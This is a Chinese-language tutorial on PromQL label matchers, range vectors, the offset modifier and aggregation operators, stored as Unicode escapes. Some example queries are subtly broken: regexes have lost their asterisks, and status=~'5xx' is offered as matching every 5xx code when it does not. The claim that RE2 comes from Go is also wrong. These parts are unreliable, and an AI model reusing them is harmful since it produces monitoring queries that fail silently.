\u67e5\u8be2\u4ec0\u4e48\u6570\u636e\uff0c\u53ea\u8981\u5199\u597dPromQL\uff0c\u5728Prometheus\u66b4\u9732\u76849090\u7aef\u53e3\u7684\u9875\u9762\u4e2d\u67e5\u8be2\u5373\u53ef\u3002 \u76f8\u5173\u8bed\u6cd5\uff1a label\u4e0a\u7684\u5339\u914d\u5668 \u5339\u914d\u5668\u662f\u4f5c\u7528\u4e8e\u6807\u7b7e\u4e0a\u7684\uff0c\u6807\u7b7e\u5339\u914d\u5668\u53ef\u4ee5\u5bf9\u65f6\u95f4\u5e8f\u5217\u8fdb\u884c\u8fc7\u6ee4\uff0cPrometheus\u652f\u6301\u5b8c\u5168\u5339\u914d\u548c\u6b63\u5219\u5339\u914d\u4e24\u79cd\u6a21\u5f0f\u3002 1.\u76f8\u7b49\u5339\u914d\u5668\uff08=\uff09 \u76f8\u7b49\u5339\u914d\u5668\uff08Equality Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u5b8c\u5168\u76f8\u540c\u7684\u6807\u7b7e\u3002\u4e0b\u9762\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\u5c31\u4f1a\u4f7f\u7528\u76f8\u7b49\u5339\u914d\u5668\u6309\u7167\u6761\u4ef6\u8fdb\u884c\u4e00\u7cfb\u5217\u8fc7\u6ee4\u3002 http_requests_total{job=\"HelloWorld\",status=\"200\",method=\"POST\",handler=\"/api/comments\"} \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u6807\u7b7e\u4e3a\u7a7a\u6216\u8005\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u4e5f\u53ef\u4ee5\u4f7f\u7528Label=\"\"\u7684\u5f62\u5f0f\u3002\u5bf9\u4e8e\u4e0d\u5b58\u5728\u7684\u6807\u7b7e\uff0c\u6bd4\u5982demo\u6807\u7b7e\uff0c\u56fe4-7\u6240\u793a\u7684go_gc_duration_seconds_count\u548c\u56fe4-8\u6240\u793a\u7684go_gc_duration_seconds_count{demo=\"\"}\u6548\u679c\u5176\u5b9e\u662f\u4e00\u6837\u7684\u3002 2.\u4e0d\u76f8\u7b49\u5339\u914d\u5668\uff08\uff01=\uff09 \u4e0d\u76f8\u7b49\u5339\u914d\u5668\uff08Negative Equality Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u4e0d\u76f8\u540c\u7684\u6807\u7b7e\u3002\u5b83\u548c\u76f8\u7b49\u5339\u914d\u5668\u662f\u5b8c\u5168\u76f8\u53cd\u7684\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u60f3\u8981\u67e5\u770bjob\u5e76\u4e0d\u662fHelloWorld\u7684HTTP\u8bf7\u6c42\u603b\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u4e0d\u76f8\u7b49\u5339\u914d\u5668\u3002 http_requests_total{job!=\"HelloWorld\"} 3.\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\uff08=~\uff09 \u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\uff08Regular Expression Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u6b63\u5219\u8fd0\u7b97\u540e\u6240\u5f97\u7ed3\u679c\u76f8\u5339\u914d\u7684\u6807\u7b7e\u3002Prometheus\u7684\u6b63\u5219\u8fd0\u7b97\u662f\u5f3a\u6307\u5b9a\u7684\uff0c\u6bd4\u5982\u6b63\u5219\u8868\u8fbe\u5f0fa\u53ea\u4f1a\u5339\u914d\u5230\u5b57\u7b26\u4e32a\uff0c\u800c\u5e76\u4e0d\u4f1a\u5339\u914d\u5230ab\u6216\u8005ba\u6216\u8005abc\u3002\u5982\u679c\u4f60\u4e0d\u60f3\u4f7f\u7528\u8fd9\u6837\u7684\u5f3a\u6307\u5b9a\u529f\u80fd\uff0c\u53ef\u4ee5\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u524d\u9762\u6216\u8005\u540e\u9762\u52a0\u4e0a\u201c. \u201d\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\u8868\u793ajob\u662f\u6240\u6709\u4ee5Hello\u5f00\u5934\u7684HTTP\u8bf7\u6c42\u603b\u6570\u3002 http_requests_total{job=~\"Hello. \"} http_requests_total\u76f4\u63a5\u7b49\u6548\u4e8e{ name =\"http_requests_total\"}\uff0c\u540e\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u548c\u524d\u8005\u4e00\u6837\u76844\u79cd\u5339\u914d\u5668\uff08=\uff0c\uff01=\uff0c=~\uff0c\uff01~\uff09\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u6848\u4f8b\u53ef\u4ee5\u8868\u793a\u6240\u6709\u4ee5Hello\u5f00\u5934\u7684\u6307\u6807\u3002 { name =~\"Hello.*\"} \u5982\u679c\u60f3\u8981\u67e5\u770bjob\u662f\u4ee5Hello\u5f00\u5934\u7684\uff0c\u4e14\u5728\u751f\u4ea7\uff08prod\uff09\u3001\u6d4b\u8bd5\uff08test\uff09\u3001\u9884\u53d1\u5e03\uff08pre\uff09\u7b49\u73af\u5883\u4e0b\u54cd\u5e94\u7ed3\u679c\u4e0d\u662f200\u7684HTTP\u8bf7\u6c42\u603b\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u65b9\u5f0f\u8fdb\u884c\u67e5\u8be2\u3002 http_requests_total{job=~\"Hello.*\",env=~\"prod|test|pre\",code!=\"200\"} \u7531\u4e8e\u6240\u6709\u7684PromQL\u8868\u8fbe\u5f0f\u5fc5\u987b\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u6307\u6807\u540d\u79f0\uff0c\u6216\u8005\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u4f1a\u5339\u914d\u5230\u7a7a\u5b57\u7b26\u4e32\u7684\u6807\u7b7e\u8fc7\u6ee4\u5668\uff0c\u56e0\u6b64\u7ed3\u5408Prometheus\u5b98\u65b9\u6587\u6863\uff0c\u53ef\u4ee5\u68b3\u7406\u51fa\u5982\u4e0b\u975e\u6cd5\u793a\u4f8b\u3002 {job=~\".*\"} # \u975e\u6cd5\uff01 {job=\"\"} # \u975e\u6cd5\uff01 {job!=\"\"} # \u975e\u6cd5\uff01 \u76f8\u53cd\uff0c\u5982\u4e0b\u8868\u8fbe\u5f0f\u662f\u5408\u6cd5\u7684\u3002 {job=~\".+\"} # \u5408\u6cd5\uff01.+\u8868\u793a\u81f3\u5c11\u4e00\u4e2a\u5b57\u7b26 {job=~\". \",method=\"get\"} # \u5408\u6cd5\uff01. \u8868\u793a\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 {job=\"\",method=\"post\"} # \u5408\u6cd5\uff01\u5b58\u5728\u4e00\u4e2a\u975e\u7a7a\u5339\u914d {job=~\".+\",method=\"post\"} # \u5408\u6cd5\uff01\u5b58\u5728\u4e00\u4e2a\u975e\u7a7a\u5339\u914d 4.\u6b63\u5219\u8868\u8fbe\u5f0f\u76f8\u53cd\u5339\u914d\u5668\uff08\uff01~\uff09 \u6b63\u5219\u8868\u8fbe\u5f0f\u76f8\u53cd\u5339\u914d\u5668\uff08Negative Regular Expression Matcher\uff09\uff0c\u7528\u4e8e\u9009\u62e9\u4e0e\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u6b63\u5219\u8fd0\u7b97\u540e\u6240\u5f97\u7ed3\u679c\u4e0d\u5339\u914d\u7684\u6807\u7b7e\u3002\u56e0\u4e3aPromQL\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u57fa\u4e8eRE2\u7684\u8bed\u6cd5\uff0c\u4f46\u662fRE2\u4e0d\u652f\u6301\u5411\u524d\u4e0d\u5339\u914d\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\uff01~\u7684\u51fa\u73b0\u662f\u4f5c\u4e3a\u4e00\u79cd\u66ff\u4ee3\u65b9\u6848\uff0c\u4ee5\u5b9e\u73b0\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u6392\u9664\u6307\u5b9a\u6807\u7b7e\u503c\u7684\u529f\u80fd\u3002\u5728\u4e00\u4e2a\u9009\u62e9\u5668\u5f53\u4e2d\uff0c\u53ef\u4ee5\u9488\u5bf9\u540c\u4e00\u4e2a\u6807\u7b7e\u6765\u4f7f\u7528\u591a\u4e2a\u5339\u914d\u5668\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u5b9e\u73b0\u67e5\u627ejob\u540d\u662fnode\u4e14\u5b89\u88c5\u5728/prometheus\u76ee\u5f55\u4e0b\uff0c\u4f46\u662f\u5e76\u4e0d\u5728/prometheus/user\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\u5e76\u786e\u5b9a\u5176\u5927\u5c0f\u3002 node_filesystem_size_bytes{job=\"node\",mountpoint=~\"/prometheus/. \", mountpoint!~ \"/prometheus/user/. \"} PromQL\u91c7\u7528\u7684\u662fRE2[1]\u5f15\u64ce\uff0c\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u3002RE2\u6765\u6e90\u4e8eGo\u8bed\u8a00\uff0c\u5b83\u88ab\u8bbe\u8ba1\u4e3a\u4e00\u79cd\u7ebf\u6027\u65f6\u95f4\u7684\u6a21\u5f0f\uff0c\u975e\u5e38\u9002\u5408\u7528\u4e8ePromQL\u8fd9\u79cd\u65f6\u95f4\u5e8f\u5217\u7684\u65b9\u5f0f\u3002\u4f46\u662f\u5c31\u50cf\u6211\u4eec\u524d\u6587\u63cf\u8ff0\u7684RE2\u90a3\u6837\uff0c\u5176\u4e0d\u652f\u6301\u5411\u524d\u4e0d\u5339\u914d\u8868\u8fbe\u5f0f\uff08\u5411\u524d\u65ad\u8a00\uff09\uff0c\u4e5f\u4e0d\u652f\u6301\u53cd\u5411\u5f15\u7528\uff0c\u540c\u65f6\u8fd8\u7f3a\u5931\u5f88\u591a\u9ad8\u7ea7\u7279\u6027\u3002 \u601d\u8003\u62d3\u5c55 =\u3001\uff01=\u3001=~\u3001\uff01~\u8fd94\u4e2a\u5339\u914d\u5668\u5728\u5b9e\u6218\u4e2d\u975e\u5e38\u6709\u7528\uff0c\u4f46\u662f\u5982\u679c\u9891\u7e41\u4e3a\u6807\u7b7e\u65bd\u52a0\u6b63\u5219\u5339\u914d\u5668\uff0c\u6bd4\u5982HTTP\u72b6\u6001\u7801\u67091xx\u30012xx\u30013xx\u30014xx\u30015xx\uff0c\u5728\u7edf\u8ba1\u6240\u6709\u8fd4\u56de\u503c\u662f5xx\u7684HTTP\u8bf7\u6c42\u65f6\uff0cPromQL\u8bed\u53e5\u5c31\u4f1a\u53d8\u6210http_requests_total{job=\"HelloWorld\"\uff0cstatus=~\"500\"\uff0cstatus=~\"501\"\uff0cstatus=~\"502\"\uff0cstatus=~\"503\"\uff0cstatus=~\"504\"\uff0cstatus=~\"505\"\uff0cstatus=~\"506\"\u2026} \u4f46\u662f\uff0c\u6211\u4eec\u90fd\u77e5\u90535xx\u4ee3\u8868\u670d\u52a1\u5668\u9519\u8bef\uff0c\u8fd9\u4e9b\u72b6\u6001\u4ee3\u7801\u8868\u793a\u670d\u52a1\u5668\u5728\u5c1d\u8bd5\u5904\u7406\u8bf7\u6c42\u65f6\u53d1\u751f\u4e86\u5185\u90e8\u9519\u8bef\u3002\u8fd9\u4e9b\u9519\u8bef\u53ef\u80fd\u6765\u81ea\u670d\u52a1\u5668\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u8bf7\u6c42\u3002 1\uff09500\uff1a\u670d\u52a1\u5668\u9047\u5230\u9519\u8bef\uff0c\u65e0\u6cd5\u5b8c\u6210\u8bf7\u6c42\uff08\u670d\u52a1\u5668\u5185\u90e8\u9519\u8bef\uff09\u3002 2\uff09501\uff1a\u670d\u52a1\u5668\u4e0d\u5177\u5907\u5b8c\u6210\u8bf7\u6c42\u7684\u529f\u80fd\u3002\u4f8b\u5982\uff0c\u5f53\u670d\u52a1\u5668\u65e0\u6cd5\u8bc6\u522b\u8bf7\u6c42\u65b9\u6cd5\u65f6\u53ef\u80fd\u4f1a\u8fd4\u56de\u6b64\u4ee3\u7801\uff08\u5c1a\u672a\u5b9e\u65bd\uff09\u3002 3\uff09502\uff1a\u670d\u52a1\u5668\u4f5c\u4e3a\u7f51\u5173\u6216\u4ee3\u7406\uff0c\u4ece\u4e0a\u6e38\u670d\u52a1\u5668\u6536\u5230\u65e0\u6548\u54cd\u5e94\uff08\u9519\u8bef\u7f51\u5173\uff09\u3002 4\uff09503\uff1a\u670d\u52a1\u5668\u76ee\u524d\u65e0\u6cd5\u4f7f\u7528\uff08\u7531\u4e8e\u8d85\u8f7d\u6216\u505c\u673a\u7ef4\u62a4\uff09\uff0c\u901a\u5e38\u53ea\u662f\u6682\u65f6\u72b6\u6001\uff08\u670d\u52a1\u4e0d\u53ef\u7528\uff09\u3002 5\uff09504\uff1a\u670d\u52a1\u5668\u4f5c\u4e3a\u7f51\u5173\u6216\u4ee3\u7406\uff0c\u4f46\u662f\u6ca1\u6709\u53ca\u65f6\u4ece\u4e0a\u6e38\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\uff08\u7f51\u5173\u8d85\u65f6\uff09\u3002 6\uff09505\uff1a\u670d\u52a1\u5668\u4e0d\u652f\u6301\u8bf7\u6c42\u4e2d\u6240\u7528\u7684HTTP\u534f\u8bae\u7248\u672c\uff08HTTP\u7248\u672c\u4e0d\u53d7\u652f\u6301\uff09\u3002 7\uff09506\uff1a\u7531\u300a\u900f\u660e\u5185\u5bb9\u534f\u5546\u534f\u8bae\u300b\uff08RFC 2295\uff09\u6269\u5c55\u800c\u6765\uff0c\u4ee3\u8868\u670d\u52a1\u5668\u5b58\u5728\u5185\u90e8\u914d\u7f6e\u9519\u8bef\u3002 8\uff09507\uff1a\u670d\u52a1\u5668\u65e0\u6cd5\u5b58\u50a8\u5b8c\u6210\u8bf7\u6c42\u6240\u5fc5\u9700\u7684\u5185\u5bb9\u3002\u8fd9\u4e2a\u72b6\u51b5\u88ab\u8ba4\u4e3a\u662f\u4e34\u65f6\u7684\u3002 9\uff09509\uff1a\u670d\u52a1\u5668\u8fbe\u5230\u5e26\u5bbd\u9650\u5236\u3002\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5b98\u65b9\u7684\u72b6\u6001\u7801\uff0c\u4f46\u662f\u4ecd\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002 10\uff09510\uff1a\u83b7\u53d6\u8d44\u6e90\u6240\u9700\u8981\u7684\u7b56\u7565\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u3002 \u4e3a\u4e86\u6d88\u9664\u8fd9\u6837\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u4f18\u5316\u3002 \u4f18\u5316\u4e00\u3000\u591a\u4e2a\u8868\u8fbe\u5f0f\u4e4b\u95f4\u4f7f\u7528\u201c|\u201d\u8fdb\u884c\u5206\u5272\uff1ahttp_requests_total{job=\"HelloWorld\"\uff0cstatus=~\"500|501|502|503|504|505|506|507|509|510\"}\u3002 \u4f18\u5316\u4e8c\u3000\u5c06\u8fd9\u4e9b\u8fd4\u56de\u503c\u5305\u88c5\u4e3a5xx\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5668\u5bf9http_requests_total{job=\"HelloWorld\"\uff0cstatus=~\"5xx\"}\u8fdb\u884c\u4f18\u5316\u3002 \u4f18\u5316\u4e09\u3000\u5982\u679c\u8981\u9009\u62e9\u4e0d\u4ee54xx\u5f00\u5934\u7684\u6240\u6709HTTP\u72b6\u6001\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528http_requests_total{status\uff01~\"4..\"}\u3002 \u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668 \u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u8fd4\u56de\u4e00\u7ec4\u65f6\u95f4\u5e8f\u5217\uff0c\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\u5305\u542b\u4e00\u6bb5\u65f6\u95f4\u8303\u56f4\u5185\u7684\u6837\u672c\u6570\u636e\u3002\u548c\u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u4ece\u5f53\u524d\u65f6\u95f4\u5411\u524d\u9009\u62e9\u4e86\u4e00\u5b9a\u65f6\u95f4\u8303\u56f4\u7684\u6837\u672c\u3002\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u4e3b\u8981\u5728\u9009\u62e9\u5668\u672b\u5c3e\u7684\u65b9\u62ec\u53f7[]\u4e2d\uff0c\u901a\u8fc7\u65f6\u95f4\u8303\u56f4\u9009\u62e9\u5668\u8fdb\u884c\u5b9a\u4e49\uff0c\u4ee5\u6307\u5b9a\u6bcf\u4e2a\u8fd4\u56de\u7684\u533a\u95f4\u5411\u91cf\u6837\u672c\u503c\u4e2d\u63d0\u53d6\u591a\u957f\u7684\u65f6\u95f4\u8303\u56f4\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u8868\u793a\u6700\u8fd15\u5206\u949f\u5185\u7684\u6240\u6709HTTP\u8bf7\u6c42\u7684\u6837\u672c\u6570\u636e\uff0c\u5176\u4e2d[5m]\u5c06\u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u8f6c\u53d8\u4e3a\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u3002 http_request_total{}[5m] \u65f6\u95f4\u8303\u56f4\u901a\u8fc7\u6574\u6570\u6765\u8868\u793a\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5355\u4f4d\u4e4b\u4e00\uff1a\u79d2\uff08s\uff09\u3001\u5206\u949f\uff08m\uff09\u3001\u5c0f\u65f6\uff08h\uff09\u3001\u5929\uff08d\uff09\u3001\u5468\uff08w\uff09\u3001\u5e74\uff08y\uff09\u3002\u9700\u8981\u5f3a\u8c03\u7684\u662f\uff0c\u5fc5\u987b\u7528\u6574\u6570\u6765\u8868\u793a\u65f6\u95f4\uff0c\u6bd4\u598238 m\u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f2 h 15 m\u548c1.5 h\u90fd\u662f\u9519\u8bef\u7684\u3002\u8fd9\u91cc\u7684y\u662f\u5ffd\u7565\u95f0\u5e74\u7684\uff0c\u6c38\u8fdc\u662f60\u00d760\u00d724\u00d7365\u79d2\u3002 \u6848\u4f8b\u4e00\uff1a\u8ba1\u7b972\u5206\u949f\u5185\u7cfb\u7edf\u8fdb\u7a0b\u7684CPU\u4f7f\u7528\u7387\u3002 rate(node_cpu[2m]) \u6848\u4f8b\u4e8c\uff1a\u8ba1\u7b97\u7cfb\u7edfCPU\u7684\u603b\u4f53\u4f7f\u7528\u7387\uff0c\u901a\u8fc7\u6392\u9664\u7cfb\u7edf\u95f2\u7f6e\u7684CPU\u4f7f\u7528\u7387\u5373\u53ef\u83b7\u5f97\u3002 1 - avg without(cpu) (rate(node_cpu{mode=\"idle\"}[2m])) \u6848\u4f8b\u4e09\uff1anode_cpu_seconds_total\u53ef\u4ee5\u83b7\u53d6\u5f53\u524dCPU\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4f7f\u7528avg\u805a\u5408\u67e5\u8be2\u5230\u6570\u636e\u540e\uff0c\u518d\u4f7f\u7528by\u6765\u533a\u5206\u5b9e\u4f8b\uff0c\u8fd9\u6837\u5c31\u80fd\u505a\u5230\u5206\u5b9e\u4f8b\u67e5\u8be2\u5404\u81ea\u7684\u6570\u636e\u3002 avg(irate(node_cpu_seconds_total{job=\"node_srv\"}[5m])) by (instance) \u5b9e\u6218\u62d3\u5c55 1\uff09\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u5f80\u5f80\u548c\u901f\u7387\u51fd\u6570rate\u4e00\u8d77\u4f7f\u7528\u3002\u6bd4\u5982\u5b50\u67e5\u8be2\uff0c\u4ee51\u6b21/\u5206\u949f\u7684\u901f\u7387\u91c7\u96c6\u5173\u4e8ehttp_requests_total\u6307\u6807\u5728\u8fc7\u53bb30\u5206\u949f\u5185\u7684\u6570\u636e\uff0c\u7136\u540e\u8fd4\u56de\u8fd930\u5206\u949f\u5185\u8ddd\u79bb\u5f53\u524d\u65f6\u95f4\u6700\u8fd1\u76845\u5206\u949f\u5185\u7684\u91c7\u96c6\u7ed3\u679c\uff0c\u5982\u4e0b\u6240\u793a\u3002 rate(http_requests_total[5m])[30m:1m] \u6ce8\u610f\uff0c\u4f7f\u7528\u4e0d\u5fc5\u8981\u7684\u5b50\u67e5\u8be2\u6216\u8005\u4e0d\u505c\u5730\u5d4c\u5957\u5b50\u67e5\u8be2\u5e76\u4e0d\u662f\u597d\u7684PromQL\u98ce\u683c\u3002 2\uff09\u4e00\u4e2a\u533a\u95f4\u5411\u91cf\u8868\u8fbe\u5f0f\u4e0d\u80fd\u76f4\u63a5\u5c55\u793a\u5728Graph\u4e2d\uff0c\u4f46\u662f\u53ef\u4ee5\u5c55\u793a\u5728Console\u89c6\u56fe\u4e2d\u3002 \u504f\u79fb\u91cf\u4fee\u6539\u5668 \u504f\u79fb\u91cf\u4fee\u6539\u5668\u53ef\u4ee5\u8ba9\u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u548c\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u53d1\u751f\u504f\u79fb\uff0c\u5b83\u5141\u8bb8\u83b7\u53d6\u67e5\u8be2\u8ba1\u7b97\u65f6\u95f4\u5e76\u5728\u6bcf\u4e2a\u9009\u62e9\u5668\u7684\u57fa\u7840\u4e0a\u5c06\u5176\u5411\u524d\u63a8\u79fb\u3002 \u77ac\u65f6\u5411\u91cf\u9009\u62e9\u5668\u548c\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\u90fd\u53ef\u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u57fa\u51c6\u4e0b\u7684\u6837\u672c\u6570\u636e\uff0c\u5982\u679c\u6211\u4eec\u8981\u83b7\u53d6\u67e5\u8be2\u8ba1\u7b97\u65f6\u95f4\u524d5\u5206\u949f\u7684HTTP\u8bf7\u6c42\u60c5\u51b5\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u8fd9\u6837\u7684\u65b9\u5f0f\u3002 http_request_total{} offset 5m \u504f\u79fb\u5411\u91cf\u4fee\u6539\u5668\u7684\u5173\u952e\u5b57\u5fc5\u987b\u7d27\u8ddf\u5728\u9009\u62e9\u5668{}\u540e\u9762\uff0c\u5982\u4e0b\u7684\u8868\u8fbe\u5f0f\u5206\u522b\u662f\u6b63\u786e\u548c\u9519\u8bef\u7684\u793a\u4f8b\u3002 sum(http_requests_total{method=\"GET\"} offset 5m) // \u6b63\u786e sum(http_requests_total{method=\"GET\"}) offset 5m // \u975e\u6cd5 \u8be5\u64cd\u4f5c\u540c\u6837\u9002\u7528\u4e8e\u533a\u95f4\u5411\u91cf\u9009\u62e9\u5668\uff0c\u6bd4\u5982\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u5176\u4ee5\u6307\u6807http_requests_total 5\u5206\u949f\u524d\u7684\u65f6\u95f4\u70b9\u4e3a\u8d77\u59cb\u9ad8\uff0c\u8fd4\u56de5\u5206\u949f\u4e4b\u5185\u7684HTTP\u8bf7\u6c42\u91cf\u7684\u589e\u957f\u901f\u7387\u3002 rate(http_requests_total[5m] offset 5m) \u504f\u79fb\u5411\u91cf\u4fee\u6539\u5668\u901a\u8fc7\u8c03\u6574\u8ba1\u7b97\u65f6\u95f4\u4e00\u6837\u53ef\u4ee5\u770b\u5230\u4e00\u4e9b\u5386\u53f2\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u4e00\u822c\u53ea\u5bf9\u8c03\u8bd5\u5355\u6761\u8bed\u53e5\u7684\u5386\u53f2\u6570\u636e\u6709\u5e2e\u52a9\u3002\u968f\u7740\u65b0\u6570\u636e\u7684\u5230\u6765\uff0c\u5386\u53f2\u6570\u636e\u4e5f\u4f1a\u4e0d\u65ad\u53d1\u751f\u53d8\u5316\uff0c\u6240\u4ee5\u5efa\u8bae\u5728Grafana\u4e2d\u76f4\u63a5\u770b\u5386\u53f2\u6570\u636e\u7684\u53d8\u5316\u8d8b\u52bf\u3002 Prometheus\u67094\u5927\u6307\u6807\u7c7b\u578b\uff08Metrics Type\uff09\uff0c\u5206\u522b\u662fCounter\uff08\u8ba1\u6570\u5668\uff09\u3001Gauge\uff08\u4eea\u8868\u76d8\uff09\u3001Histogram\uff08\u76f4\u65b9\u56fe\uff09\u548cSummary\uff08\u6458\u8981\uff09\u3002\u8fd9\u662f\u5728Prometheus\u5ba2\u6237\u7aef\uff08\u76ee\u524d\u4e3b\u8981\u6709Go\u3001Java\u3001Python\u3001Ruby\u7b49\u8bed\u8a00\u7248\u672c\uff09\u4e2d\u63d0\u4f9b\u76844\u79cd\u6838\u5fc3\u6307\u6807\u7c7b\u578b\uff0c\u4f46\u662fPrometheus\u7684\u670d\u52a1\u7aef\u5e76\u4e0d\u533a\u5206\u6307\u6807\u7c7b\u578b\uff0c\u800c\u662f\u7b80\u5355\u5730\u628a\u8fd9\u4e9b\u6307\u6807\u7edf\u4e00\u89c6\u4e3a\u65e0\u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u3002\u672a\u6765\uff0cPrometheus\u5b98\u65b9\u5e94\u8be5\u4f1a\u505a\u51fa\u6539\u53d8 \u805a\u5408\u51fd\u6570\uff1a Prometheus\u8fd8\u63d0\u4f9b\u4e86\u4e0b\u5217\u5185\u7f6e\u7684\u805a\u5408\u64cd\u4f5c\u7b26\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u7b26\u4f5c\u7528\u57df\u77ac\u65f6\u5411\u91cf\u3002\u53ef\u4ee5\u5c06\u77ac\u65f6\u8868\u8fbe\u5f0f\u8fd4\u56de\u7684\u6837\u672c\u6570\u636e\u8fdb\u884c\u805a\u5408\uff0c\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u65f6\u95f4\u5e8f\u5217\u3002 sum (\u6c42\u548c) min (\u6700\u5c0f\u503c) max (\u6700\u5927\u503c) avg (\u5e73\u5747\u503c) stddev (\u6807\u51c6\u5dee) stdvar (\u6807\u51c6\u65b9\u5dee) count (\u8ba1\u6570) count_values (\u5bf9value\u8fdb\u884c\u8ba1\u6570) bottomk (\u540en\u6761\u65f6\u5e8f) topk (\u524dn\u6761\u65f6\u5e8f) quantile (\u5206\u4f4d\u6570) \u4f7f\u7528\u805a\u5408\u64cd\u4f5c\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a <aggr-op>([parameter,] <vector expression>) [without|by (<label list>)] \u5176\u4e2d\u53ea\u6709 count_values , quantile , topk , bottomk \u652f\u6301\u53c2\u6570(parameter)\u3002 without\u7528\u4e8e\u4ece\u8ba1\u7b97\u7ed3\u679c\u4e2d\u79fb\u9664\u5217\u4e3e\u7684\u6807\u7b7e\uff0c\u800c\u4fdd\u7559\u5176\u5b83\u6807\u7b7e\u3002by\u5219\u6b63\u597d\u76f8\u53cd\uff0c\u7ed3\u679c\u5411\u91cf\u4e2d\u53ea\u4fdd\u7559\u5217\u51fa\u7684\u6807\u7b7e\uff0c\u5176\u4f59\u6807\u7b7e\u5219\u79fb\u9664\u3002\u901a\u8fc7without\u548cby\u53ef\u4ee5\u6309\u7167\u6837\u672c\u7684\u95ee\u9898\u5bf9\u6570\u636e\u8fdb\u884c\u805a\u5408\u3002 \u4f8b\u5982\uff1a sum(http_requests_total) without (instance) \u7b49\u4ef7\u4e8e sum(http_requests_total) by (code,handler,job,method) \u5982\u679c\u53ea\u9700\u8981\u8ba1\u7b97\u6574\u4e2a\u5e94\u7528\u7684HTTP\u8bf7\u6c42\u603b\u91cf\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u8868\u8fbe\u5f0f\uff1a sum(http_requests_total) count_values\u7528\u4e8e\u65f6\u95f4\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a\u6837\u672c\u503c\u51fa\u73b0\u7684\u6b21\u6570\u3002count_values\u4f1a\u4e3a\u6bcf\u4e00\u4e2a\u552f\u4e00\u7684\u6837\u672c\u503c\u8f93\u51fa\u4e00\u4e2a\u65f6\u95f4\u5e8f\u5217\uff0c\u5e76\u4e14\u6bcf\u4e00\u4e2a\u65f6\u95f4\u5e8f\u5217\u5305\u542b\u4e00\u4e2a\u989d\u5916\u7684\u6807\u7b7e\u3002 \u4f8b\u5982\uff1a count_values(\"count\", http_requests_total) topk\u548cbottomk\u5219\u7528\u4e8e\u5bf9\u6837\u672c\u503c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd4\u56de\u5f53\u524d\u6837\u672c\u503c\u524dn\u4f4d\uff0c\u6216\u8005\u540en\u4f4d\u7684\u65f6\u95f4\u5e8f\u5217\u3002 \u83b7\u53d6HTTP\u8bf7\u6c42\u6570\u524d5\u4f4d\u7684\u65f6\u5e8f\u6837\u672c\u6570\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\uff1a topk(5, http_requests_total) 